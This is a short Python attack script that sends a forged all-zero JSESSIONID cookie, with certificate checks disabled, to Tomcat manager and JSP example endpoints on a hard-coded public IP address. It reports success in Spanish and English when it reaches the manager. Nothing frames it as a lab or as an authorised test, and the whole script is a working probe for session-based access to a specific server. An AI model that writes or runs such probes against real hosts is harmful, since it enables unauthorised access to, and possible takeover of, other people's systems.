#!/usr/bin/env python3
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def test_session_access():
    target = "https://189.254.143.102"
    session_id = "00000000000000000000000000000000"
    
    session = requests.Session()
    session.cookies.set('JSESSIONID', session_id)
    session.verify = False
    
    endpoints = [
        "/manager/html",
        "/manager/list",
        "/manager/status",
        "/jsp/",
        "/examples/jsp/"
    ]
    
    print("=== TESTING SESSION ACCESS ===")
    for endpoint in endpoints:
        try:
            r = session.get(f"{target}{endpoint}", timeout=10)
            print(f"{endpoint}: Status {r.status_code} - Length: {len(r.text)}")
            
            if r.status_code == 200:
                print(f"   ✅ ACCESO CONCEDIDO!")
                if "manager" in endpoint:
                    print(f"   🔥 MANAGER ACCESSIBLE!")
                    
        except Exception as e:
            print(f"{endpoint}: Error - {e}")

if __name__ == "__main__":
    test_session_access()
